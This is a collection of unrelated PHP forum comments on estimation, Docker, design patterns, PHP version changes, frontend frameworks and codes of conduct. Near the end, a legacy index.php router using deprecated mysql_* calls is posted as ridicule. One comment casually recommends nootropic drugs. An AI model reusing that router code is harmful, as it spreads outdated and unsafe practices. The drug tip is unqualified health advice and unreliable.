Notepad?!?! Are you serious? Lol! Sounds like you got out at the right time.
You'll find if you use relative estimation that a fairly accurate picture of time will reveal itself within a couple of iterations. It's not at the task level, which can be unsettling but consider: 1. A team has an established velocity of 10pts per sprint 2. There are 100pts with of work on the backlog If a sprint is 10 days long, the backlog will be finished in 100 days. You can then apply some wiggle room to that (plot a 10% increase in velocity and a 10% decrease) and you end up with an optimistic completion date, an estimated completion date and a pessimistic completion date. You can set this sort of thing to track in real time so the business person who is used to tracking time can make calls on whether or not they think they are getting value, what time impact of adding more work is, what time impact of descoping is etc. I've found using this is more realistic. The completion date is based on data gathered during the development process as opposed to someone arbitrarily setting some times to some items and complaining when time taken inevitably exceeds the initial estimate.
Supposedly this month sometime :)
Thanks for this. Your readme could be a bit more explanatory, especially for those that don't know how Docker works.
I don't like splitting http web server and php to different containers. For some reason it's common in docker, but I've never seen it used like this in real production environment (where docker is not used).
PHPStorm is way better than sliced bread also. Actually, I could probably live without sliced bread if I needed to. Can't say the same for PHPStorm.
&gt; if I have to check if someone can transfer money on several places, I will make one service which does the work and use it everywhere That is exactly what Specification pattern is. You calling it a service does not change a thing. Specification is IMHO one of the most underused patterns that should be in every developers arsenal. It is just good OOP design that follows SRP and DRY. Not to mention that it keeps your business rules in an easy to discover place and it is trivial to unit test.
https://github.com/consolidation/Robo - it's php version of grunt and it's awesome, makes automation of many tasks way easier
Of course! I learn something every day and there is so many things for studing. But i mean career. Should i aspire to?
What method do you guys use to test if your emails are sending or not?
Being conservative about breaking backwards-compatibility, in a mature language, is not really a bad thing. If upgrading is difficult, people don't do it. The dilemma for PHP is that it has a lot of things it might be nice to get rid of, but they are very much an ingrained part of the language, so you have to be very careful about touching them.
There is really only one "valid" use case for `empty()`, which is using it as sugar for `count($array) === 0`. If you're religious about only using it on arrays, it's not bad, because there's zero chance of it giving you a result that you wouldn't expect under any circumstance. Using it on other types is just begging for bugs.
Why do you construct sentences like an elementary-schooler?
I ask anyone that are reading my answer: what's more likely: 1 - someone intentionally redefined $this inside a method and now suffers because of an awful BC break 2 - someone in the future mistakenly assigns $this and is thankful PHP warned him, fixed his code and moved on 7.1 breaks are fixes, fixes that will be released 1 year after 7.0! yes, one full year! in the meantime you probably changed your Javascript tools 7 times already. PHP should not break things because it's mature, sure. But PHP must take care not to become a crippled old man, which has so many unfixable problems, that can barely stay alive.
1. Agree. Sometime in such cases I just ask few hours for research. Some time ago I had an research for an project estimation. Research took 160h and estimation was 120h (this was image recognition stuff and pretty much all that I needed was done via research). 2. Yep 3. Fully agreed. 
&gt; You refer to the Snapshot isolation anomalies. If that's an issue chose a vendor like &gt;=Postgres-9.1 or MySQL which doesn't suffer from that. AFAIK MySQL doesn't support true predicate locking, it does index locks which prevents some similar scenarios... but only if the predicate would use an index to resolve its condition. &gt; Again: No that's not what I said. The repository is absolutely the wrong place to manage transactions. The transaction spans the use case in the application level, nowhere else. I'm so sorry and surprised that I obviously was not clear enough and left so much space for interpretation. If the repository, which has unique knowledge of the storage mechanism, doesn't manage the transaction, you're doomed to crude measures: serializable or nothing. And if your DB doesn't offer true serializability (which for most PHP users with MySQL it doesn't) then you're screwed. Something's gotta give.
LOL. Becouse my native language is Russian. Learning English is not simple for me, but i try :)
That's why I wrote "where docker is not used" in brackets. If you didn't use the docker in production, would you really split nginx and php to separate servers? Even if you used all of those servers you just wrote, I doubt one of them wouldn't have **both** nginx and php installed. We are not using docker in production (yet), we are using it to mimic production environment in development. And it's really good for that. But, most dockerfile guides assume you want to split your services as much as possible, which is fallacy. Most people use LAMP on single server. You also write what stuff you *could* do, not what you actually do. My motto is KISS and YAGNI and I don't like adding unnecessary complexity. I don't like splitting services to gazillion containers as is trend in docker community. It's over engineered. With this in future you might as well go through rabbit hole and end up with separate container for each library. When there comes the time where you need to scale, you can easily split services then, according to actual need.
You can either learn more technologies or more high level concepts. I agree that you should learn more full stack stuff. Learn how to provision and automate servers, learn Docker, etc. But then start learning new concepts. Machine learning and artificial intelligence. Learn 3D graphics. Get an arduino and play with hardware. Don't worry about taking temporary diversions. Every new thing you learn, whether or not it relates to your work, enhances you as a whole. 
The nightly has php7 support 8.2 should be released soon, but yes it's support is much slower then PHPStorm but hey it's opensource and free :)
Learn Magento. And you will be able to get $2k or even $4k if you are team leader in Russia. These numbers are for Ukraine. One guy from Ukraine who worked for Magento that started to freelance makes $60 per hour fulltime maybe even more than fulltime :-) Magento may seem kinda too over-engineered but it pays, ha :-) P.S. Magento 2 looks same time really nice and sexy...kinda like a MILF because it was started long time ago. You will need to learn knockouts instead of Angular. But there might be something nice in mix of knockouts with Magento. Also magento 2 is huge like bbw in some weird love triangles between layered 3rd party vendors :-) Too many variables so Zend Studio crashes and doesn't display local variables when you try to debug Magento 2 and understand how it works. Sometimes basic things take days instead of minutes. But when you know most of it you feel like flying :-) Kinda like a powerful queen with too many zaebov, anyway every human just a set of excuses :-) So Magento kinda like a collective mind of them :-) Be safe, use unite tests ;-) You are young so it's not a problem to spend few nights without sleep with her once in a while. You can get Magento Certified for start. But before that learn patterns, etc. as suggested here. Enterprise clients for Magento pay big $. Because their entry was $10k at least. Companies that make over $1mln per year. Maybe even take nootropics to increase memory, energy and endurance. Phenylpiracetam, Selank, Semax from drug stores russian made.
A higher paid web developer. Simple as that. And to get that you need the right skills. What was suggested above is a great start. Integrations with Rest/Soap, interactions with APIs basically and the server side of things will get you a long way. Im mainly a magento dev (though I do all sorts of PHP work) and i get £15 an hour. 
i guess you need to be more tough and strategic in Russia :-) but yep, this may work too. Than doing something in Skolkovo, etc)
Transaction *control* happens in the application layer. That's the bit you appear to be missing here. Yes, your infrastructure layer is responsible for relaying the necessary instructions to your data source, but it's all controlled from higher up.
https://www.amazon.com/Design-Patterns-Elements-Reusable-Object-Oriented-ebook/dp/B000SEIBB8
&gt; Transaction control happens in the application layer. That's the bit you appear to be missing here. Yes, your infrastructure layer is responsible for relaying the necessary instructions to your data source, but it's all controlled from higher up. Ok, bear with me here. How is the application layer sending those kinds of intents in a storage layer neutral way: - Open a READ REPEATABLE transaction, read the user balance and put a read-write lock (FOR UPDATE) on it. - Open a SERIALIZABLE transaction in READ ONLY mode. I'll learn something today.
This is better https://sourcemaking.com/design_patterns
It's fairly common to put nginx and php-fpm in one container. When you do this, you also need to install and setup a third program to start and monitor php and nginx, usually monit, supervisord or similar. Docker containers will only start ones process when a new container is run, so in that case we use supervisord/monit/whatever as the "entry" process, and then that is responsible for running php/nginx. Reasons for splitting it out include: 1. It's easier than the setup explained above 2. Someone may want nginx to load balancer between multiple containers running php Network overhead isn't really a reason not to split it out imo, altho everyone's use case and needs are different. Side note: I'm making a docker series right now at shippingdocker.com. The free videos on it cover a similar setup (and explain it). In that case, nginx and php are two separate containers because it's easier and more demonstrative of now docker works.
Try to track jobs on freelance websites (Russian and international both), see what technologies/frameworks are in demand and how much they pay.
Sure, the `$this` changes don't break anything, but that might be a misrepresentation, they're some of the least objectionable changes in 7.1. More bothersome would be, say, the changes I introduced (`E_WARNING` and `E_NOTICE` in certain arithmetic operations), which I understand some people have found bothersome.
Learn another language. Pick up go or Python or both, both excellent languages as well. They'll open up the markets even more for you.
&gt; The removal of deprecated functions to free up space for new features I don't think PHP has any sort of hard size limit on the binary.* Deprecated features aren't removed to “free up space”, they're removed so people can't use them. ^(*Though that would be interesting. We could be like video game developers for cartridge-based systems, trying our best to squeeze in as much as possible!)
Why do you construct sentences like a professional jerk. Programming transcends language barriers. Not everybody speaks your language. Find a middle ground and don't be so abrasive to someone who you've never met.
&gt; why bother with all that unnecessary code Because specifications are part of your domain. They are business rules and thus you should be able to represent them in code in a way that you are able to talk about them with your domain experts (the guys that actually know if a zero amount is allowed or not). Obviously all that only makes sense if you actually have a domain. If you're doing some fancier CRUD stuff you won't have much business logic at all and all this DDD-ish stuff is over-engineering.
The correct function for the unlimited amount of change would be: &lt;?php define('SCALE', 2); function change(string $amount, array $denominations): array { rsort($denominations, SORT_NUMERIC); return array_map(function (string $value) use (&amp;$amount): string { if (bccomp($value, $amount) &gt; 0) return 0; $amount = bcsub($amount, bcmul($out = bcdiv($amount, $value, 0), $value, SCALE), SCALE); return $out; }, array_combine($denominations, $denominations)); } The idea is you must [never operate on raw floats](http://0.30000000000000004.com/). The two common approaches are either to use the `bc` functions, or to multiply all floats by the needed precision (100) and operate on integers. 
Look when I thought I knew a lot, I found something new I never heard about. For example, I recently learned to use a messages broker (rabbit mq). A new world unfolded in front of my hungry mind. It has been quite interesting months, and still have so much to learn. Anyway, my point is, keep finding new challenges, there are no actual boundaries, programming nowadays is actually an incredible thing and sometimes it's actually a kind of magic
Why would they have to do the second one? They would do $foo = MyClass::create(); And then $foo-&gt;whatever(); Or skip assignment and do whatever with it. The point is anything you're picturing with MyClass::$instance is replaced with the create line, without the need of exposing instance variables. (Or worse, newing your class anyway only to hand it right back to your class, with direct instance variable assignment to boot.) If you only want one instance you simply new it only once and return the same one the rest of the time.
I work under a contract. The contract may have milestones that determine pay amount and festers done etc. Any time something changes, maybe feature request to add something, a oops on deadline on my part or more times the some feature needs changed after client tests. I do change orders. Why? Everything is documented and then explained in detail. If you went to have your car fixed and when it was done the bill was 20% more you'd probably be pissed, or they fixed something else instead while never fixed the original issue. On hours issue, I have 1000's of code snippets. You need a blog? 10 minutes. But I charge a week. You need complex acl? 15 minutes but I charge 20 hours. You need dynamic menu and a simple page creator/editor like most cms's? Done in a few hours but once again charged a week. But the first time I created the snippet or package I lost money/time. In the end though it equals less time and more profit yet fully tested, optimized and tweaked to meet the clients requirements. Not to mention on interviews awesome code examples. 
Create a public static function someFunction(){} and call it like this. Could pass the variable through as a parameter MyClass::someFunction();
You don't know what you're talking about, obviously... an app/site built on Drupal or Wordpress that requires minimal code is your best bet. Alternatively, learn to program it yourself with laravel/symfony/whatever + react/angular/whatever... or just hire someone who knows what they're doing.
ZF2 does that all over the place. For example setting the default Translator for the AbstractValidator class.
You can try [this script](https://codecanyon.net/item/euphonize-music-sharing-social-platform/11064436) from an author on CodeCanyon. It supports pro/premium accounts (which could be your donation system) but you would have to check to see if you can limit the number of tracks free accounts can listen to. Check out the demo and you should be able to find out if you can or not! Alternatively you'll find similar pre-built scripts on [CodeCanyon](http://codecanyon.net) so it may be worth having a search there! Best of luck. 
Man glad you managed to make it work. I can totally relate to your experience of installing it every 6 months and being disappointed by the lack of useful php plugins, but looks like our wait is over 
Composer doesn't support anti-patterns.
That was never a requirement.
And PHP tells me that your function is syntactically invalid...
&gt; It's fairly common to put nginx and php-fpm in one container. The downsides of it is that you can't use official images. DRY, maintainability, single responsibility... you'll have to maintain this images full by yourself. As for "simple setup", I'm not agree with you. It's maybe simpler but not easier. &gt; The free videos on it cover a similar setup Where you have single responsibility per container or this "container = vm so go on and put everything into it" 
The more I've learned about Docker the more I realize how much time and effort I've been wasting by raising and tending to unicorns.
Composer is watching you masturbate.
https://en.wikipedia.org/wiki/Cargo_cult
Hi, I ended up configuration everything manual on the AWS and for deployment I go an ssh into server every 2 weeks to do the release. I wish I had time to play more with this but right now I'm full. After I discuss with few people I think Ansible would be a way to go to achieve this. If I get time and I figure it out I'll let you know.
Yeah, been using it the past two days and it is really really nice. I'm excited.
vue.js
There are real BC breaks in this version, and that's a problem for some projects, for example read the whole discussion here: https://twitter.com/CiaranMcNulty/status/777473238968496128
What a complete tool, it was obvious from the first sentence he wasn't a native English speaker and he mentioned further in the post he's Russian. Either answer the post on topic or piss off bullying people. His English is much better than your Russian
Stay away from Angular 2. It's far too new - I think it's just been officially released - so I'd give it six months to a year to shake out a bit more. That said, AngularJS is incredible. It changed the way I write web apps. My opinion is that SPAs are likely the future of web development and you should be writing them unless you have a compelling reason not to, and Angular is great at them. It's got a bit of a learning curve, but if you can grok it, you'll wonder what you ever did without it. I mean, it's hella popular for a reason, so you might as well give it a chance. My advice would be to download a simple boilerplate AngularJS 1.5 front end, and then run through some tutorials on Codecademy or elsewhere. You don't need NodeJS (though it's good to be able to use that and npm too). If it really is too much, then try Vue or React and then see what you think of AngularJS when you've more experience with front end stuff.
Thanks for your constructive feedback. You make some valid points. And in fact I only ever used this approach for methods with 2-3 arguments that either were scalars or very simple objects. Totally agree with "it's best to judge on a case by case basis." and will see to update the article to highlight this better.
[ob_get_clean](http://php.net/manual/en/function.ob-get-clean.php) executes both [ob_get_contents()](http://php.net/manual/en/function.ob-get-contents.php) and [ob_end_clean()](http://php.net/manual/en/function.ob-end-clean.php), so that probably wasn't your issue. But it's good that you've figured it out on your own.
He doesn't need a singleton. He needs a factory. So other than announcing to a bunch of strangers that you know how a singleton works, what's the point of mentioning this?
Liam-fd, i have the script you suggested. It was obviously based on or made by the same person who made the one i shared a link to.
Angular 2 is very, _very_ different to Angular 1. You may wish to clarify which you are talking about here as it's a little confusing. Angular 2 has only just hit stable, and I've seen some cases where it's faster than React (and vice versa).
You wouldn't so much integrate it with it I don't think. You'd much more likely be developing a web service API that your front-end Angular application would use. As for ease of integration, Angular 1.x has been around for a long time now, and has a lot of documentation, tooling, tutorials, etc. It's pretty easy to get going with it. Angular 2 has only just gone "final", so tutorials are being updated, even the official documentation is still being updated. That being said, learning Angular 2 now is not a bad idea. If this project of yours is a pet project, not something for a client, then I'd say go for it and learn Angular 2. It's good to be keeping on top of this stuff, and you'll be ready then when everyone's really into it.
Angular, etc works better for developing web clients that talk to an API. Try using Plates or Twig to clean up your PHP views.
Yup, moved on to bigger and better things, it all worked out. When i was being interviewed for a job at EA, they of course asked about why i left my previous job. The shit i told them about the way that company did business and handled is employees had them paying attention for about an hour before we reminded ourselves we weren't there just to talk about that lol 
the current trend is to use PHP as the back end, and separating a client side application with Endpoints. Rather then mixing in Javascript. 
I cant plus 1 Sunshine enough. I submitted three talks, but will be there even if Im not speaking.
What's the relationship to a CoC here?
Yup, I know what a CoC is, and what they're for, I fail to see how it applies to this case?
yawn... you need to speak to a business advisor. You've also used two terms, then abandoned their established meaning. * Estimate - "an approximate calculation or judgement of the value, number, quantity, or extent of something." You seem to be confusing estimate with flat-rate or fixed-price. They are separate models. * Contract - A contract is a voluntary arrangement between two or more parties that is enforceable at law as a binding legal agreement. If you change the contract, then you are basically tearing it up, and it cannot be used. This sucks, but it's the way it could go. If a contract that was mutually agreed needs revision, then revise it for future work. Please don't encourage brats to be brats.
And I prefer unsliced bread; I want to choose my own thickness. Now pre-shucked pecans: that's a modern miracle. Phpstorm being better than that is really saying something.
Angular 2 is way better to develop with than Angular 1. It's way more intuitive and it being "new" is no excuse not to learn it. I've been making an enterprise-class front-end with it since before the first RC and while the breaking changes were minor annoyances, they were never set backs. Angular 1 is an ugly mess that no one should have to use anymore.
Does not mean it is a good trend. Edit: typo.
If you're using React, I'd recommend you back it with Redux for unidirectional data flow and immutability. It allows you to write pure React components that perform better. That said, if you like the idea of React and Redux, take a look at Elm. It's a functional language that compiles to JavaScript but because it's functional (similar to Haskell) it forces you into immutability and unidirectional data flow. Unlike React and Redux, it's not optional. It's also by and large more performant than any other JavaScript framework.
It kind of depends on what you mean by "front end framework". Based on what you said in your post, it sounds like what you want is actually a template engine. Something that makes rendering HTML interlaced with dynamic content simpler than just sticking php echo statements all over the place. Template engines will typically have some kind of back-end class library that you use to render templates with bound variables or objects, and then within the templates themselves you'll use some kind of template language so instead of &lt;?php echo $var; ?&gt; you can instead just do something like this {{$var}} You'll also get some control flow logic, loop constructs, and typically other helpers as well which is nice. I've worked with Smarty, but there are a ton of good options for template engines. Angular 2 isn't a template engine. Like you said, it's a framework. And it's not just a front-end framework either. It's a complete application framework. It just happens to use strictly client-side code (JavaScript). You can code a complete application in nothing but Angular 2. Granted, most Angular 2 apps will consume some kind of back-end service, typically in the form of HTTP based API calls, but none the less, Angular 2 is a complete framework. Angular 2 isn't just the "V" part of a larger MVC application. So how should you proceed? Well it kind of depends on where you're at with your skills and what your needs are. There is tremendous value in *truly* understanding the MVC design pattern. It's still very common and very powerful. If you don't really feel like you "get" MVC completely yet, then I'd continue utilizing MVC, implement a template engine, and continue on your merry way. How do you know if you "get" MVC? Well, that's a complicated question, but I'd say if you're at a point where you truly are keeping your Views clear of business logic, and your controllers and models are capable of being unit tested because you're utilizing good separation of concerns and a dependency injection pattern then you probably have a firm grasp on MVC. If you feel like you understand MVC, have realized its shortcomings when it comes to web applications with complicated highly dynamic UIs, it's never a bad time to jump into a client-side framework + API design pattern, and Angular 2 is an awesome way to go about that. I think it's a pretty natural progression. Once you are proficient in MVC, you start realizing that you have a desire to write more and more complicated JavaScript in your Views to make them more dynamic and user friendly. You might find yourself wanting fewer page refreshes so you start doing things like writing controller methods that return JSON instead of rendering a view, and using the controller as a pseudo API with a ton of complicated jQuery to handle the responses in the View. If you've reached this point, then you're definitely ready for a paradigm shift and a new design pattern. Angular 2 might seem scary, but it's really not so bad. Give yourself credit for what you already know. If you can do MVC, you can do Angular 2. Just take your time, and make sure you learn the big picture concepts before you jump into code. Don't make the classic mistake of hacking apart pre-built sample applications and trying to expand on them before you really know what you're doing and why you're doing it. You're gonna have to learn a few new things with Angular, but make sure you fully understand these concepts before you get too deep into coding an app: * TypeScript transpilation and definition files. This really isn't that difficult. Yes you need NodeJS/npm, but for the most part it's "set it and forget it" after you configure your project to start automatically transpiling your TypeScript files on save and you've got the proper definitions downloaded. It's extremely important you understand at a high level exactly what role npm is playing in the larger picture though, so don't skimp on learning this stuff. * Consuming an HTTP API as a service. Probably a REST API. Again, this is extremely important as you'll likely be writing clients for HTTP APIs for the foreseeable future. * Importing modules with SystemJS. Pretty straightforward to learn, but it's integral to Angular 2 unless you feel like using another module loader for some reason, but all the Angular 2 examples I've seen and Angular's own quickstart guide uses SystemJS. Don't neglect truly understanding how the SystemJS config file works. Again, don't just copy/paste stuff from examples. Move code around and really get to know the configuration file so you can make your module imports work in any way you want them do. * Don't neglect learning how to package and deploy your application. It's fairly straightforward to get an Angular 2 app running on your local machine, but getting it packaged, deployed, and running on a remote server is another story. I think Angular 2 uses Webpack now for packaging, so familiarize yourself with that. Depending on what you want your deployment to look like, you can either transpile and package up JavaScript, or configure the remote server to download TypeScript source and transpile it on the remote server. I don't think there's really a right and wrong way to go here. And don't forget if you're consuming an API that you wrote yourself, you'll have to fit that piece into the puzzle as well. Good luck!
The power of MVC really comes into play when you're not just developing an application, but refactoring or maintaining an application. Especially a large one, and even more so if you work on a team. Having the rendered HTML completely abstracted away from the back-end is great when you work with a team that has a dedicated front end specialist who doesn't know back-end code. And on the back end, having the controllers and models separated makes testing simpler. Although writing testable code for web applications is an art form unto its self. If you're not already writing code that can be unit tested, I'd probably take a crack at that before diving into a whole new design pattern. Learning how to write code that can be tested really makes you feel like you've leveled up as a developer, and it will make understanding some of the concepts of Angular 2 easier to boot. Make sure you understand the difference between a unit test and an integration test. Dependency injection is a big concept that a lot of people struggle to grasp, but once it clicks your code will immediately become a ton cleaner.
You can do this with Vue https://github.com/vuejs/vue-loader Having a single file with html, js and css for a component is one of the things I fell in love with.
I grew up on the web not actually knowing the age, race, sex, or sexual orientation of anyone in programming forums and chatrooms. Recent assumptions I made about the age, sex, religion and race of people I spoke to on a learn-to-code site turned out to *all* be wrong. And that's the way I like it. The code of conduct should be "stay anonymous and only talk about the project at hand".
I found one example but I thought the way it was implemented it was good that I should have another virtual machine with automatically generated root directory as the container was built to manipulate root's ~/.ssh directory on the host's filesystem and did not provide an alternative. I thought that a bit hazardous decided to skip the fun. I like that Docker can easily run complex stuff, verify container signatures and has a cool slotted update system. I think it might be interesting to use IPFS volumes to share files in swarms and to initialise the containers directly from signed sources on IPFS volumes. It thought it would be highly convenient to the next generation decentralised operating systems to have IPFS backing and also cool. To my joy I found a container for just that and more. https://ipfs.io/blog/1-run-ipfs-on-docker/ https://hub.docker.com/_/consul/ I'm containerising compulsively now just about everything and it feels so right to give in to a little OCD and to build a really resilient system with almost no effort. Another great thing would be to have some mesh with my swarm. https://wiki.openwrt.org/doc/howto/docker_openwrt_image
Arrow functions is "complete" - it's just undecided if we (the people I collaborate with and me) want to move forward with it in this form. Some people think dropping the `^` prefix and removing the ability to provide type information would be better because 1) it's exactly the syntax that JavaScript has and 2) type information works against the point of being short. So yeah, that's the current state there.
Forgive my poor choice of words. I didn't mean incomplete as in; "you need to add more to it" but rather incomplete as in not-yet-voted-on. Incomplete has ambiguous meaning here. Edit: I'm not trying to disparage your efforts - I pointed out the not-accepted-state in response to "in PHP 7.2, or so" which as far as I could tell, was not the case.
Is this really something you should be doing with Laravel?
Telling people they should be anonymous is the exact opposite of not caring.
I would probably stick with the classic automysqlbackup and rsnapshot
Ah, not only a few. I have three large projects to maintain that use ZF2. Understanding the source of ZF2 is faster than reading their docs, that's the sad state of the framework.
If incredibly racist/sexist/everything-ist muslim extremists working on their taliban websites in php can look at error messages in Hebrew and not give a shit and keep on using php then why the fuck do we have to care about genitals or race or religion? Developers should primarily care about working code. Terrorist devs don't want their bombs exploding prematurely. Aircraft devs don't want their altitude calculations to be inaccurate. Cancer treatment devs don't want to administer the wrong amount of radiation. 
Lolz, those were the days.
The most common misconception with Docker is that a container is a server, a more accurate comparison is that a container is a virtual process. You may not have Nginx and PHP on separate servers without Docker, but you would have them running as multiple processes on the same server. Using docker, you can deploy your PHP and Nginx containers to the same server for exactly the same result. Once you have your docker containers set up, it's a case of choosing which servers will run what services, not having one server per service. The containers share resources quite efficiently, the overhead of running 20 x PHP scripts in separate containers isn't much different than running the same 20x scripts in separate terminal windows, and nowhere near as bad as running 20x VMs which is how some people seem to think Docker works. With that in mind, having a container for each library isn't that bad, as it is effectively configuring a command to be run. For example it's common to have a container to run PHPUnit as otherwise you end up manually pushing the command into the existing PHP container which are practically identical operations from Dockers perspective. I like Docker and see it improving rapidly, if only they could fix the OSX performance issues I would consider it a powerful dev tool rather than something to keep an eye on.
At least those files are not in production. Right? Right?
Not a single class implementation :P Library focused on performance. https://github.com/nikic/FastRoute 
Production == Development == Staging
Exactly, why differentiate? Just host all your clients' sites in MAMP/XAMPP directly on your machine, then all of your changes are immediately in development, staging, and production! A huge timesaver.
.js files too? or .env?
Professionally I'm in contact (apart from CI) Symfony, Laravel and Zend none of which are 'latest toys' or 'sweet, super new, super shiny, super sexy framework' they have been around for many years (even before CI in some cases) its nothing to do with them being new, they aren't. Its the fact they are stable, mature projects that makes me use them. Their age has no bearing on the code quality, they have adapted over time from lessons learnt and grown into the frameworks they are today, CI didn't do this and carried on blindly producing crap (until this rewrite). Namespacing and Autoloading are just 2 of the many points wrong with CI, the list is extensive and out of the scope of the original post. I'm not here to make other people use one framework or another, quite frankly I don't care what you use, it was asked what I thought of CI4 and I gave an honest opinion, good they are going in the right direction but too late to the party. Put it this way, if CI3 was 'amazing' then: - firstly the owners wouldn't have abandoned it and - secondly the new owners wouldn't be doing a complete rewrite from scratch to fix all the problems
I think what you're trying to achieve is a [singleton](http://designpatternsphp.readthedocs.io/en/latest/Creational/Singleton/README.html). Singletons are meant to be self contained and you're not meant to be calling it's constructor from outside the class as that could cause unwanted behaviour. &lt;?php class MyClass { private static $instance; protected function __construct() { } public static function getInstance() { if ( ! static::$instance instanceof static) { static::$instance = new static(); } return static::$instance; } } Although from what I can see you're most likely better off using a [factory](http://designpatternsphp.readthedocs.io/en/latest/Creational/SimpleFactory/README.html).
not private, protected
Surfing on [my wave of upvotes](https://pay.reddit.com/r/webdev/comments/53bmwh/version_control_in_real_life/), mmh? =)
When version controlling like a neanderthal isn't primitive enough for your tastes.
I'm moderately in favour of CoCs, whilst being open to good faith warnings about potential problems. However, if you are going to use the phrase `attention whoring` and `this crap` and `pushing agendas` then I'll downvote and switch off. We do not need this sort of aggression injected into the debate. 
Of course they are. Client of mine's private server, with a whopping 150k+ unique visitors monthly.
.js files yes - that's how they work, by making their contents visible to the browser .env files maybe - they shouldn't be in your public directory but it depends on your configuration. 
It's a repost anyway, maybe you'll enjoy this excerpt from the "real" index.php... I only edited it so far as to protect the guilty: Who needs a RouterServiceLocatorFinderContractualInterface anyway? &lt;?php str_replace(chr(146), "&amp;#8217;", $str); require_once "globals.php"; require_once "backoffice/classes/db.php"; require_once "backoffice/classes/common.class.php"; $includepage='pages/accueil.php'; $VariableURL = urldecode($_SERVER['QUERY_STRING']); $pos =strpos($VariableURL,".htm"); if ($pos&gt;0) $VariableURL = substr($VariableURL, 0, $pos); $Argument = split('[/&amp;]', $VariableURL); //explode("/", ); $rubrique = 0; $id = 0; $db=db_connect(""); mysql_query('SET NAMES utf8;'); mysql_query('SET CHARACTER SET utf8;'); if ((isset($Argument[0]))&amp;&amp;($Argument[0]!="")) { $rubrique = $rubs[$Argument[0]]; $sousrubrique = ""; $categorie = ""; $pagetitle = $titles[$Argument[0]]; $action = ""; $search = ""; $page = 1; switch($rubrique) { case $actus: $includepage='pages/accueil.php'; break; case $concours: $includepage='concours/concours.php'; break; case $protecttheguiltypayment: $sousrubrique = 0; if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) $sousrubrique = $rubs[$Argument[1]]; $includepage='pages/paiement/##################.php'; break; case $protecttheguilty: if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) { $values = explode("-",$Argument[1]); $id=+$values[0]; $pagetitle=str_replace("-"," ",substr($Argument[1],strpos($Argument[0],"-"))); } $includepage='pages/##########.php'; break; case $protecttheguilty3: $sousrubrique = 0; if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) $sousrubrique = $rubs[$Argument[1]]; if ($rubrique==$payline) $includepage='pages/paiement/##################.php'; else $includepage='pages/paiement/##################.php'; break; case $protecttheguilty4: if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) $ville = $Argument[1]; $includepage='pages/###########################/reportages.php'; $sousrubrique=$reportages; if ((isset($Argument[2]))&amp;&amp;($Argument[2]!="")) { $sousrubrique = $rubs[$Argument[2]]; switch($sousrubrique) { case $protecttheguilty13: if ((isset($Argument[3]))&amp;&amp;($Argument[3]!="")) $categorie = $Argument[3]; if ((isset($Argument[4]))&amp;&amp;($Argument[4]!="")) $page = $Argument[4]; if ((isset($Argument[5]))&amp;&amp;($Argument[5]!="")) { $values = explode("-",$Argument[5]); $id=+$values[0]; $pagetitle.=str_replace("-"," ",substr($Argument[5],strpos($Argument[5],"-")+1)); } $includepage='pages/###############/promos.php'; break; case $protecttheguilty14: if ((isset($Argument[3]))&amp;&amp;($Argument[3]!="")) $categorie = $Argument[3]; if ((isset($Argument[4]))&amp;&amp;($Argument[4]!="")) $page = $Argument[4]; if ((isset($Argument[5]))&amp;&amp;($Argument[5]!="")) { $values = explode("-",$Argument[5]); $id=+$values[0]; $pagetitle.=str_replace("-"," ",substr($Argument[5],strpos($Argument[5],"-")+1)); } $includepage='pages/##################/reporters.php'; break; case $protecttheguilty15: case $protecttheguilty16: if ((isset($Argument[3]))&amp;&amp;($Argument[3]!="")) $categorie = $Argument[3]; if ((isset($Argument[4]))&amp;&amp;($Argument[4]!="")) $page = $Argument[4]; if ((isset($Argument[5]))&amp;&amp;($Argument[5]!="")) { $values = explode("-",$Argument[5]); $id=+$values[0]; $pagetitle.=str_replace("-"," ","&amp;nbsp;article ".$Argument[5]); } $includepage='pages/##################/reportages.php'; if ($sousrubrique==$coupsdegueule) $includepage='pages/###############/coupsdegueule.php'; break; default: $sousrubrique = $Argument[2]; break; } } break; case $tableaudebord: if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) $categorie = $Argument[1]; if ((isset($Argument[2]))&amp;&amp;($Argument[2]!="")) $action = $Argument[2]; if ((isset($Argument[3]))&amp;&amp;($Argument[3]!="")) { $id=+$Argument[3]; $pagetitle.=str_replace("-"," ",substr($Argument[3],strpos($Argument[3],"-")+1)); } $includepage='pages/#################/tableaudebord.php'; break; case $protecttheguilty22: $includepage='pages/#############.php'; break; case $protecttheguilty24: if ((isset($Argument[0]))&amp;&amp;($Argument[0]!="")) { if ((isset($Argument[1]))&amp;&amp;($Argument[1]=="validation")) { $titles["newsletter"] = "Inscription validée"; $includepage='pages/############ok.php'; } else { $includepage='pages/########.php'; } } break; case $protecttheguilty33: if ((isset($Argument[0]))&amp;&amp;($Argument[0]!="")) { if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) { $values = explode("-",$Argument[1]); $pagetitle.=str_replace("-"," ",substr($Argument[1],strpos($Argument[1],"-")+1)); } $includepage='pages/#######################################.php'; } break; case $protecttheguilty45: if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) { $values = explode("-",$Argument[1]); $id=+$values[0]; $pagetitle.=str_replace("-"," ",substr($Argument[1],strpos($Argument[1],"-")+1)); } $includepage='pages/########.php'; break; case $articles: if ((isset($Argument[2]))&amp;&amp;($Argument[2]!="")) { if ($sousrubrique==$cinema) $categorie = $rubs[$Argument[2]]; else { if ($Argument[2]=='salles') $categorie = $rubs[$Argument[2]]; else $categorie = $Argument[2]; } } if ($categorie==$salles) { $temp = $categorie; $categorie = $sousrubrique; $sousrubrique = $temp; } else if ($sousrubrique==$cinema) { if ($categorie!=0) $sousrubrique = $categorie; } break; case $annuaire: if ((isset($Argument[1]))&amp;&amp;($Argument[1]!="")) $rubrique = $rubs[$Argument[1]]; if ((isset($Argument[3]))&amp;&amp;($Argument[3]!="")) $page=+$Argument[3]; if ((isset($Argument[4]))&amp;&amp;($Argument[4]!="")) { $values = explode("-",$Argument[4]); $id=+$values[0]; $pagetitle.=str_replace("-"," ","-".$Argument[3]."-".substr($Argument[4],strpos($Argument[4],"-")+1)); } if ((isset($Argument[5]))&amp;&amp;($Argument[5]!="")) { $values = explode("-",$Argument[5]); $id=+$values[0]; $pagetitle.="-".$Argument[3].str_replace("-"," ",substr($Argument[5],strpos($Argument[5],"-")+1)); } $includepage='pages/annuaire/annuaire.php'; break; } } require_once "pages/utils.php";
No private.
Fuck testing, too!
